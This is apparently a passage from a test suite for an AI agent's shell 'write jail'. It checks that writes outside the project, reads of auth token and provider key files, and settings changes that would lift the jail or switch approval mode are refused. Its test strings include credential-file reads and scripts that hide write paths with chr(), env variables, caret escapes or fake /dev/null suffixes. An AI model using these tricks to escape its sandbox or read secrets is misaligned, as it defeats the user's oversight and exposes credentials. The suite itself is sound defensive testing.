    from remedy.skills.tool_registry import ToolRegistry

    monkeypatch.setattr(APPROVALS, "needs_ask", lambda *a, **k: None)

    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()
    home = tmp_path / "home"
    home.mkdir()

    rt = _make_runtime(sticky, scope="project", home=home)
    reg = ToolRegistry()
    rt.tool_registry = reg  # type: ignore[attr-defined]
    rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
    rt._session_id = "jail-session"  # type: ignore[attr-defined]
    register_workspace_tools(rt)

    bad = (
        f'Set-Content -Path "{folder / "pwn.txt"}" -Value "nope" -Encoding utf8'
    )
    result = await reg.execute("bash_exec", command=bad)
    assert "WRITE_JAIL" in result or "jail" in result.lower() or "outside" in result.lower()
    assert not (folder / "pwn.txt").exists()


@pytest.mark.asyncio
async def test_bash_exec_write_roots_fail_closed(tmp_path: Path, monkeypatch):
    """write_roots() failure must not fall back to Desktop/Docs read roots."""
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.core.approvals import APPROVALS
    from remedy.skills.tool_registry import ToolRegistry

    monkeypatch.setattr(APPROVALS, "needs_ask", lambda *a, **k: None)

    proj = tmp_path / "proj"
    proj.mkdir()
    home = tmp_path / "home"
    home.mkdir()
    rt = _make_runtime(proj, scope="project", home=home)
    reg = ToolRegistry()
    rt.tool_registry = reg  # type: ignore[attr-defined]
    rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
    rt._session_id = "jail-session"  # type: ignore[attr-defined]

    def _boom():
        raise RuntimeError("roots unavailable")

    rt.write_roots = _boom  # type: ignore[method-assign]
    register_workspace_tools(rt)
    out = await reg.execute("bash_exec", command="echo hi")
    assert "WRITE_JAIL" in out
    assert "roots" in out.lower()


@pytest.mark.asyncio
async def test_job_run_verify_write_jail_parity(tmp_path: Path, monkeypatch):
    """job_run/mission_verify must share bash_exec shell write jail (no silent bypass)."""
    from remedy.core.approvals import APPROVALS
    from remedy.core.jobs import run_verify_job

    monkeypatch.setattr(APPROVALS, "needs_ask", lambda *a, **k: None)

    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()
    rt = _make_runtime(sticky, scope="project", home=tmp_path / "home")

    bad = f'Set-Content -Path "{folder / "pwn.txt"}" -Value "nope" -Encoding utf8'
    result = await run_verify_job(rt, command=bad, path=str(sticky))
    assert result.ok is False
    assert "WRITE_JAIL" in result.summary or "jail" in result.summary.lower()
    assert not (folder / "pwn.txt").exists()
    assert (result.details or {}).get("write_jail") or "WRITE_JAIL" in result.summary


@pytest.mark.asyncio
async def test_job_run_verify_write_roots_fail_closed(tmp_path: Path, monkeypatch):
    """write_roots() failure on verify job must fail closed (no shell run)."""
    from remedy.core.approvals import APPROVALS
    from remedy.core.jobs import run_verify_job

    monkeypatch.setattr(APPROVALS, "needs_ask", lambda *a, **k: None)

    proj = tmp_path / "proj"
    proj.mkdir()
    rt = _make_runtime(proj, scope="project", home=tmp_path / "home")

    def _boom():
        raise RuntimeError("roots unavailable")

    rt.write_roots = _boom  # type: ignore[method-assign]
    result = await run_verify_job(rt, command="echo hi")
    assert result.ok is False
    assert "WRITE_JAIL" in result.summary
    assert "roots" in result.summary.lower()


@pytest.mark.asyncio
async def test_update_settings_refuses_project_switch_without_force(tmp_path: Path):
    """Regression: agent must not silently retarget SecretSticky → SecretFolder."""
    from remedy.core.agent_settings_tools import register_settings_tools
    from remedy.skills.tool_registry import ToolRegistry

    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()

    class RT:
        def __init__(self) -> None:
            self.tool_registry = ToolRegistry()
            self._proj = sticky.resolve()

        def project_path_is_unset(self) -> bool:
            return False

        def effective_project_path(self) -> Path:
            return self._proj

    rt = RT()
    register_settings_tools(rt)
    out = await rt.tool_registry.execute(
        "update_settings",
        project_path=str(folder),
    )
    assert "PROJECT_JAIL" in out or "refusing to switch" in out.lower()


@pytest.mark.asyncio
async def test_update_settings_refuses_unset_project_and_home_scope(tmp_path: Path):
    """Model must not lift the write jail via empty project_path or access_scope=home."""
    from remedy.core.agent_settings_tools import register_settings_tools
    from remedy.skills.tool_registry import ToolRegistry

    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()

    class RT:
        def __init__(self) -> None:
            self.tool_registry = ToolRegistry()
            self._proj = sticky.resolve()

        def project_path_is_unset(self) -> bool:
            return False

        def effective_project_path(self) -> Path:
            return self._proj

    rt = RT()
    register_settings_tools(rt)
    out = await rt.tool_registry.execute("update_settings", project_path="")
    assert "PROJECT_JAIL" in out or "refusing to clear" in out.lower()
    out_os = await rt.tool_registry.execute(
        "update_settings", project_path=r"C:\Windows"
    )
    assert "PROJECT_FORBIDDEN" in out_os or "not allowed" in out_os.lower()
    out2 = await rt.tool_registry.execute("update_settings", access_scope="home")
    assert "APPROVAL_REQUIRED" in out2
    out3 = await rt.tool_registry.execute("update_settings", approval_mode="auto")
    assert "APPROVAL_REQUIRED" in out3


def test_shell_blocks_auth_secret_reads(tmp_path: Path):
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    roots = [sticky.resolve()]
    cases = [
        r"type C:\Users\Administrator\.remedy\auth\local_api_token",
        r"Get-Content $env:USERPROFILE\.remedy\auth\provider_keys.json",
        r"type %USERPROFILE%\.remedy\auth\local_api_token",
    ]
    for cmd in cases:
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected auth jail for: {cmd}"
        assert "auth" in hit.lower()


def test_script_scan_blocks_outside_write(tmp_path: Path):
    from remedy.core.shell_write_jail import scan_script_source_for_outside_writes

    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    evil = sticky / "pwn.py"
    evil.write_text(
        "open(r'C:\\\\Users\\\\Public\\\\pwn.txt','w').write('x')\n",
        encoding="utf-8",
    )
    hit = scan_script_source_for_outside_writes(evil, write_roots=[sticky.resolve()])
    assert hit is not None
    ok = sticky / "ok.py"
    ok.write_text("print(1)\n", encoding="utf-8")
    assert scan_script_source_for_outside_writes(ok, write_roots=[sticky.resolve()]) is None
    constructed = sticky / "built.py"
    constructed.write_text(
        "from pathlib import Path\n(Path('C:/')/'Users'/'Public'/'x').write_text('z')\n",
        encoding="utf-8",
    )
    assert scan_script_source_for_outside_writes(
        constructed, write_roots=[sticky.resolve()]
    ) is not None
    nested = sticky / "nested_open.py"
    nested.write_text(
        "import os\n"
        "open(os.path.join('C:', os.sep, 'Users', 'Public', 'x'), 'w')\n",
        encoding="utf-8",
    )
    assert scan_script_source_for_outside_writes(
        nested, write_roots=[sticky.resolve()]
    ) is not None
    chr_open = sticky / "chr_open.py"
    chr_open.write_text(
        "open(chr(67)+':/Users/Public/x', 'w')\n",
        encoding="utf-8",
    )
    assert scan_script_source_for_outside_writes(
        chr_open, write_roots=[sticky.resolve()]
    ) is not None
    env_open = sticky / "env_open.py"
    env_open.write_text(
        "import os\nopen(os.environ['USERPROFILE']+'\\\\Desktop\\\\x', 'w')\n",
        encoding="utf-8",
    )
    assert scan_script_source_for_outside_writes(
        env_open, write_roots=[sticky.resolve()]
    ) is not None


def test_script_scan_blocks_home_env_paths(tmp_path: Path):
    """Project-bound helpers that write via Path.home / expanduser / env must fail closed."""
    from remedy.core.shell_write_jail import scan_script_source_for_outside_writes

    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    roots = [sticky.resolve()]
    cases = [
        "from pathlib import Path\nPath.home().joinpath('Desktop','pwn.txt').write_text('x')\n",
        "import os\nopen(os.path.expanduser('~/Desktop/pwn.txt'),'w').write('x')\n",
        r'Set-Content -Path $env:USERPROFILE\Desktop\pwn.txt -Value x',
        r"echo pwn > %USERPROFILE%\Desktop\pwn.txt",
        'url = "https://example.com/#x"; Path.home().joinpath("Desktop","pwn.txt").write_text("x")\n',
        'print(f"{1:#x}"); Path.home().joinpath("Desktop","pwn.txt").write_text("x")\n',
    ]
    for i, src in enumerate(cases):
        helper = sticky / f"pwn_{i}.py"
        helper.write_text(src, encoding="utf-8")
        hit = scan_script_source_for_outside_writes(helper, write_roots=roots)
        assert hit is not None, f"expected jail for home/env helper: {src!r}"

    ok_env = sticky / "env_ok.py"
    ok_env.write_text('import os\nprint(os.environ.get("PATH"))\n', encoding="utf-8")
    assert scan_script_source_for_outside_writes(ok_env, write_roots=roots) is None
    ok_join = sticky / "join_ok.ps1"
    ok_join.write_text(
        "Write-Host (Join-Path $PSScriptRoot 'out.txt')\n", encoding="utf-8"
    )
    assert scan_script_source_for_outside_writes(ok_join, write_roots=roots) is None
    ok_comment = sticky / "comment_ok.py"
    ok_comment.write_text("# Path.home()\nprint(1)\n", encoding="utf-8")
    assert scan_script_source_for_outside_writes(ok_comment, write_roots=roots) is None

    # Profile-covering write roots: Path.home is not automatically illegal.
    home_ok = sticky / "home_ok.py"
    home_ok.write_text(
        "from pathlib import Path\nprint(Path.home())\n", encoding="utf-8"
    )
    assert (
        scan_script_source_for_outside_writes(
            home_ok, write_roots=[sticky.resolve(), Path.home().resolve()]
        )
        is None
    )


@pytest.mark.asyncio
async def test_run_python_file_allows_environ_path(tmp_path: Path, monkeypatch):
    proj = tmp_path / "proj"
    proj.mkdir()
    helper = proj / "env_ok.py"
    helper.write_text(
        "import os\nprint(os.environ.get('PATH', ''))\n", encoding="utf-8"
    )
    _rt, reg = _register_shell_runtime(tmp_path, proj, monkeypatch)
    out = await reg.execute("run_python_file", path=str(helper))
    assert "WRITE_JAIL" not in out, out
    assert "exit_code=0" in out


def _register_shell_runtime(tmp_path: Path, proj: Path, monkeypatch):
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.core.approvals import APPROVALS
    from remedy.skills.tool_registry import ToolRegistry

    monkeypatch.setattr(APPROVALS, "needs_ask", lambda *a, **k: None)
    monkeypatch.setattr(
        "remedy.interfaces.api_support.load_config",
        lambda: {"approval_mode": "auto", "access_scope": "project"},
    )
    APPROVALS.set_mode("auto")
    home = tmp_path / "home"
    home.mkdir(exist_ok=True)
    rt = _make_runtime(proj, scope="project", home=home)
    reg = ToolRegistry()
    rt.tool_registry = reg  # type: ignore[attr-defined]
    rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
    rt._session_id = "jail-session"  # type: ignore[attr-defined]
    register_workspace_tools(rt)
    return rt, reg


@pytest.mark.asyncio
async def test_host_script_write_host_allowed_when_project_bound(
    tmp_path: Path, monkeypatch
):
    """Pathless Write-Host / Get-Date must not hit pwsh -Command oneshot jail."""
    import os

    from remedy.execution.host.session import close_all_shared_sessions

    proj = tmp_path / "proj"
    proj.mkdir()
    _rt, reg = _register_shell_runtime(tmp_path, proj, monkeypatch)
    try:
        out = await reg.execute("host_script", lang="pwsh", body="Write-Host hi")
        assert "WRITE_JAIL" not in out, out
        if "not recognized" not in out.lower() and "not found" not in out.lower():
            assert "exit_code=0" in out or "hi" in out.lower()
        cmd_out = await reg.execute("host_script", lang="cmd", body="echo hi")
        assert "WRITE_JAIL" not in cmd_out, cmd_out
        if os.name == "nt":
            assert "exit_code=0" in cmd_out or "hi" in cmd_out.lower()
    finally:
        await close_all_shared_sessions()


@pytest.mark.asyncio
async def test_host_script_refuses_outside_and_home_writes(
    tmp_path: Path, monkeypatch
):
    from remedy.execution.host.session import close_all_shared_sessions

    proj = tmp_path / "proj"
    proj.mkdir()
    _rt, reg = _register_shell_runtime(tmp_path, proj, monkeypatch)
    try:
        outside = await reg.execute(
            "host_script",
            lang="pwsh",
            body=r'Set-Content C:\Users\Public\pwn.txt pwned',
        )
        assert "WRITE_JAIL" in outside
        home = await reg.execute(
            "host_script",
            lang="pwsh",
            body=r'Set-Content -Path $env:USERPROFILE\Desktop\pwn.txt -Value x',
        )
        assert "WRITE_JAIL" in home
        py_home = await reg.execute(
            "host_script",
            lang="python",
            body="from pathlib import Path\nPath.home().joinpath('Desktop','pwn.txt').write_text('x')\n",
        )
        assert "WRITE_JAIL" in py_home
        py_nested = await reg.execute(
            "host_script",
            lang="python",
            body=(
                "import os\n"
                "open(os.path.join('C:', os.sep, 'Users', 'Public', 'x'), 'w')\n"
            ),
        )
        assert "WRITE_JAIL" in py_nested
    finally:
        await close_all_shared_sessions()


@pytest.mark.asyncio
async def test_host_session_cd_outside_resets_and_jails_relative(
    tmp_path: Path, monkeypatch
):
    """session=true leftover cwd must not allow relative writes outside roots."""
    import os

    from remedy.core.approvals import APPROVALS
    from remedy.execution.host.session import close_all_shared_sessions, get_shared_session

    monkeypatch.setattr(
        "remedy.interfaces.api_support.load_config",
        lambda: {"approval_mode": "auto", "access_scope": "project"},
    )
    prev = APPROVALS._mode  # noqa: SLF001
    APPROVALS.set_mode("auto")
    proj = tmp_path / "proj"
    proj.mkdir()
    _rt, reg = _register_shell_runtime(tmp_path, proj, monkeypatch)
    marker = f"remedy_jail_leak_{os.getpid()}.txt"
    if os.name == "nt":
        outside = Path(r"C:\Users\Public")
        cd_cmd = r"cd /d C:\Users\Public"
    else:
        outside = Path("/tmp")
        cd_cmd = "cd /tmp"
    leak = outside / marker
    if leak.exists():
        leak.unlink()
    try:
        out = await reg.execute("bash_exec", command=cd_cmd, session=True)
        assert "WRITE_JAIL" in out

        out2 = await reg.execute(
            "bash_exec", command=f"echo pwn > {marker}", session=True
        )
        assert not leak.exists(), f"relative write leaked to leftover cwd: {out2}"

        # Leftover session cwd (without going through the close-on-cd path).
        sess = await get_shared_session(cwd=str(proj), session_id="jail-session")
        await sess.run(cd_cmd, timeout=15)
        leftover = await sess.current_cwd()
        assert leftover, leftover
        out3 = await reg.execute(
            "bash_exec", command=f"echo pwn > {marker}", session=True
        )
        assert "WRITE_JAIL" in out3
        assert not leak.exists(), f"relative write used leftover session cwd: {out3}"
    finally:
        if leak.exists():
            leak.unlink()
        APPROVALS.set_mode(prev)
        await close_all_shared_sessions()


def test_full_sandbox_has_no_workdir_jail(tmp_path: Path):
    from remedy.core.approvals import APPROVALS
    from remedy.execution.sandbox import allowed_paths_for_shell

    prev = APPROVALS.mode
    try:
        APPROVALS.set_mode("full")
        assert allowed_paths_for_shell([tmp_path], tmp_path) == []
        APPROVALS.set_mode("auto")
        roots = allowed_paths_for_shell([tmp_path], tmp_path)
        assert tmp_path in roots
    finally:
        APPROVALS.set_mode(prev)


def test_pytest_is_not_a_script_launch(tmp_path: Path):
    """uv/python -m pytest must not body-scan test files (in-project builds)."""
    from remedy.core.shell_write_jail import extract_script_launch_targets

    sticky = tmp_path / "proj"
    sticky.mkdir()
    for cmd in (
        "uv run pytest -q",
        "uv run pytest tests/test_foo.py",
        "python -m pytest tests/test_foo.py",
        "pytest tests/test_foo.py",
        "ruff check src",
        "mypy src",
    ):
        assert extract_script_launch_targets(cmd) == [], cmd
        assert looks_like_mutation(cmd) is False, cmd
        assert (
            check_shell_write_jail(
                cmd,
                write_roots=[sticky.resolve()],
                cwd=sticky,
                project_bound=True,
                approval_mode="auto",
            )
            is None
        ), cmd

    assert extract_script_launch_targets("python tests/test_foo.py") == [
        "tests/test_foo.py"
    ]
    assert extract_script_launch_targets("node write.js") == ["write.js"]


def test_shell_write_jail_scans_in_root_script_launch(tmp_path: Path):
    """An in-root script path must not skip a body scan of the launched file."""
    sticky = tmp_path / "proj"
    sticky.mkdir()
    drop = sticky / "drop.py"
    drop.write_text(
        "from pathlib import Path\nPath.home().joinpath('Desktop','pwn.txt').write_text('x')\n",
        encoding="utf-8",
    )
    hit = check_shell_write_jail(
        f'python "{drop}"',
        write_roots=[sticky.resolve()],
        cwd=sticky,
        project_bound=True,
        approval_mode="auto",
    )
    assert hit is not None


def test_auto_still_blocks_outside_writes(tmp_path: Path):
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    hit = check_shell_write_jail(
        r"Set-Content C:\Users\Public\pwn.txt pwned",
        write_roots=[sticky.resolve()],
        cwd=sticky,
        project_bound=True,
        approval_mode="auto",
    )
    assert hit is not None
    assert "outside" in hit.lower() or "write jail" in hit.lower()


def test_full_warn_does_not_block_outside_writes(tmp_path: Path):
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    hit = check_shell_write_jail(
        r"Set-Content C:\Users\Public\pwn.txt pwned",
        write_roots=[sticky.resolve()],
        cwd=sticky,
        project_bound=True,
        approval_mode="full",
    )
    assert hit is None
    # Opaque / encoded mutations also proceed — Full is owner control.
    assert (
        check_shell_write_jail(
            "python -c \"open(r'C:\\\\Users\\\\Public\\\\x','w').write('z')\"",
            write_roots=[sticky.resolve()],
            cwd=sticky,
            project_bound=True,
            approval_mode="full",
        )
        is None
    )


def test_full_still_blocks_auth_secrets(tmp_path: Path):
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    hit = check_shell_write_jail(
        r"type C:\Users\Administrator\.remedy\auth\local_api_token",
        write_roots=[sticky.resolve()],
        cwd=sticky,
        project_bound=True,
        approval_mode="full",
    )
    assert hit is not None
    assert "auth" in hit.lower()


def test_root_relative_and_caret_dests_fail_closed(tmp_path: Path):
    """Issue 1: \\Temp, C:^\\Temp, C:\"\\Temp\" must extract and jail."""
    from remedy.core.shell_write_jail import extract_path_candidates

    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    roots = [sticky.resolve()]
    cases = [
        r"echo pwn > \Temp\pwn.txt",
        r"echo pwn > C:^\Temp\pwn.txt",
        r'Set-Content C:"\Temp\pwn.txt" pwn',
    ]
    for cmd in cases:
        toks = extract_path_candidates(cmd)
        assert toks, f"expected dest token in {cmd!r}, got {toks}"
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            approval_mode="auto",
        )
        assert hit is not None, f"expected jail for {cmd!r} toks={toks}"


def test_posix_in_root_abs_and_devnull_not_jailed(tmp_path: Path):
    """Unix abs dests under write roots and /dev/null must not fail-closed."""
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    ok = sticky / "ok.txt"
    roots = [sticky.resolve()]
    in_root = f'echo y > "{ok}"'
    assert (
        check_shell_write_jail(
            in_root,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            approval_mode="auto",
        )
        is None
    ), in_root
    for cmd in (
        "echo hi > /dev/null",
        "pytest -q > /dev/null",
        "echo hi > NUL",
        "dir 2>nul",
    ):
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            approval_mode="auto",
        )
        assert hit is None, f"devnull/NUL dest should not jail: {cmd!r} → {hit}"
    # Windows-style still fail-closed on every OS
    hit = check_shell_write_jail(
        r"echo pwn > \Temp\pwn.txt",
        write_roots=roots,
        cwd=sticky,
        project_bound=True,
        approval_mode="auto",
    )
    assert hit is not None
    # Suffix /dev/null is a real path, not the device — fail closed
    for cmd in (
        r"echo pwn > \Temp\dev\null",
        r"echo pwn > C:\Users\Public\dev\null",
        r"echo pwn > /tmp/evil/dev/null",
    ):
        sneak = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            approval_mode="auto",
        )
        assert sneak is not None, f"path named dev/null must jail: {cmd!r}"


def test_versioned_and_nested_script_launch_body_scan(tmp_path: Path):
    """Issue 2: python3.12 / cmd /c python / bare .js home writes fail closed."""
    from remedy.core.shell_write_jail import extract_script_launch_targets

    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    drop = sticky / "drop.py"
    drop.write_text(
        "from pathlib import Path\nPath.home().joinpath('Desktop','pwn.txt').write_text('x')\n",
        encoding="utf-8",
    )
    js = sticky / "drop.js"
    js.write_text(
        "const os = require('os');\n"
        "require('fs').writeFileSync(os.homedir() + '/pwn.txt', 'x');\n",
        encoding="utf-8",
    )
    js_env = sticky / "env.js"
    js_env.write_text(
        "require('fs').writeFileSync(process.env.USERPROFILE + '/pwn.txt', 'x');\n",
        encoding="utf-8",
    )
    roots = [sticky.resolve()]

    assert extract_script_launch_targets("python3.12 drop.py") == ["drop.py"]
    assert extract_script_launch_targets("python312 drop.py") == ["drop.py"]
    assert extract_script_launch_targets("cmd /c python drop.py") == ["drop.py"]
    assert extract_script_launch_targets("drop.py") == ["drop.py"]
    assert extract_script_launch_targets("node drop.js") == ["drop.js"]

    for cmd in (
        "python3.12 drop.py",
        "python312 drop.py",
        "cmd /c python drop.py",
        "python drop.py",
        "node drop.js",
        "node env.js",
    ):
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            approval_mode="auto",
        )
        assert hit is not None, f"expected jail for launched home-write: {cmd!r}"


def test_npm_install_still_allowed_in_project(tmp_path: Path):
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    hit = check_shell_write_jail(
        "npm install lodash",
        write_roots=[sticky.resolve()],
        cwd=sticky,
        project_bound=True,
        approval_mode="auto",
    )
    assert hit is None

